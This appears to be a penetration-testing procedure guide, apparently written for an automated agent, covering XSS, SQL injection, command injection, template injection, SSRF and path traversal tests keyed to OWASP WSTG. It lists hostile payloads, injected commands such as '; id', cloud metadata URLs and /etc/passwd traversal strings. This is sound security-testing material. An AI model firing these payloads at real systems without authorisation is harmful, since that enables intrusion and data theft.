# Input Validation Testing — Detailed Procedures

Reference guide for Phase 4 of the pentest workflow. Read this file at the start of Phase 4.

## 4A. XSS Testing (WSTG-INPV-01, WSTG-INPV-02) — MUST

**Execute for EVERY endpoint with reflected/stored input:**

Step 1: Inject canary into each parameter
- Send `CANARY12345REFLECT` to each parameter via `curl`
  ```bash
  ```
- Check response body for the canary string
- If canary appears: note the reflection context (HTML body, attribute, JS, URL)

Step 2: Test context-appropriate payloads
- HTML body: `<script>alert('XSS')</script>`, `<img src=x onerror=alert(1)>`
- Attribute: `" onmouseover="alert(1)`, `" onfocus="alert(1)" autofocus="`
- JS context: `';alert(1);//`, `</script><script>alert(1)</script>`
- URL context: `javascript:alert(1)`

Step 3: Test filter bypass if payloads blocked
- Case variations: `<ScRiPt>`, `<IMG SRC=x>`
- Encoding: URL-encode, double-encode, HTML entities
- Tag alternatives: `<svg onload=alert(1)>`, `<details open ontoggle=alert(1)>`
- Use `get_test_payloads("WSTG-INPV-01")` for full payload list

Step 4: Test stored XSS — submit payloads to forms that store data (comments, profile fields), then visit the display page

Step 5: `track_test(eid, "WSTG-INPV-01", "completed", "Tested N endpoints...")` and same for WSTG-INPV-02

## 4B. SQL Injection Testing (WSTG-INPV-05) — MUST

**Execute for every endpoint that may query a database:**

Step 1: Error-based detection
- Inject `'` (single quote) into each parameter
- Check for SQL errors: "SQL syntax", "ORA-", "mysql_", "pg_query", "SQLITE_ERROR"
- Inject `' OR '1'='1` and `' OR '1'='2` — compare response differences

Step 2: Boolean-based blind detection
- Send: `value' AND '1'='1` (true) vs `value' AND '1'='2` (false)
- If responses differ (content length, content, status): likely injectable

Step 3: Time-based blind detection
- MySQL: `value' AND SLEEP(5)--`
- MSSQL: `value'; WAITFOR DELAY '0:0:5'--`
- PostgreSQL: `value' AND pg_sleep(5)--`
- If response delayed ~5 seconds: confirmed blind SQLi

Step 4: UNION-based (if error-based confirmed)
- Determine column count: `' ORDER BY 1--`, `' ORDER BY 2--`, ... until error
- Test: `' UNION SELECT NULL,NULL,...--`

Step 5: Launch `sqlmap` in background for confirmed/suspected injectable endpoints

Step 6: If NoSQL database suspected (MongoDB, CouchDB), test with `nosqli`:
```bash
```
Also test NoSQL-specific payloads: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`

Step 7: `track_test(eid, "WSTG-INPV-05", "completed", "Tested N endpoints...")`

## 4C. Command Injection (WSTG-INPV-12) — MUST

**For endpoints processing user input server-side (file operations, email, diagnostics):**

Step 1: Identify targets — file upload/processing, PDF generation, email sending, ping/traceroute tools

Step 2: Test command separators
- Linux: `; id`, `| id`, `` `id` ``, `$(id)`, `&& id`
- Windows: `& dir`, `| dir`, `&& dir`

Step 3: Time-based blind detection
- `; sleep 5`, `| sleep 5`, `$(sleep 5)`
- If response delayed ~5 seconds: confirmed

Step 4: `track_test(eid, "WSTG-INPV-12", "completed", "Tested N endpoints...")`

## 4D. Server-Side Template Injection (WSTG-INPV-18) — MUST

Step 1: Inject math expressions into all text parameters
- `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `{{7*'7'}}`
- If response contains `49`: template engine is processing input

Step 2: Identify engine
- `{{7*'7'}}` returns `7777777` → Jinja2/Twig
- `${7*7}` returns `49` → Freemarker/Velocity/Java EL
- `<%= 7*7 %>` returns `49` → ERB (Ruby)

Step 3: Safe RCE detection (do NOT execute system commands)
- Jinja2: `{{config.items()}}` or `{{self.__class__}}`

Step 4: Run `sstimap` for automated testing of suspected endpoints:
```bash
```
sstimap automatically detects the template engine and confirms injection. Verify findings manually.

Step 5: `track_test(eid, "WSTG-INPV-18", "completed", "Tested N endpoints...")`

## 4E. SSRF (WSTG-INPV-19) — MUST

**For any parameter accepting URLs or hostnames (`?url=`, `?redirect=`, `?callback=`, `?image=`):**

Step 1: Test internal access
- `http://127.0.0.1`, `http://localhost`, `http://[::1]`
- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://metadata.google.internal/` (GCP metadata)

Step 2: Test bypass techniques
- Decimal IP: `http://2130706433` (= 127.0.0.1)
- Hex IP: `http://0x7f000001`
- URL encoding: `http://%31%32%37%2e%30%2e%30%2e%31`

Step 3: Run `ssrfmap` for automated testing of suspected endpoints:
- Create a request file with the vulnerable parameter marked as `XXXX`
- Available modules: `readfiles`, `portscan`, `aws`, `gce`

Step 4: `track_test(eid, "WSTG-INPV-19", "completed", "Tested N endpoints...")`

## 4F. Path Traversal / File Include (WSTG-INPV-04) — MUST

**For parameters that reference files (`?file=`, `?path=`, `?page=`, `?template=`):**

Step 1: Test traversal payloads
- `../../../etc/passwd` (Linux), `..\..\..\..\windows\win.ini` (Windows)
- Filter bypass: `....//....//....//etc/passwd`
- URL-encoded: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- Double-encoded: `%252e%252e%252f`

Step 2: Check response for file contents (`root:x:0:0` for Linux, `[extensions]` for Windows)

Step 3: `track_test(eid, "WSTG-INPV-04", "completed", "Tested N endpoints...")`
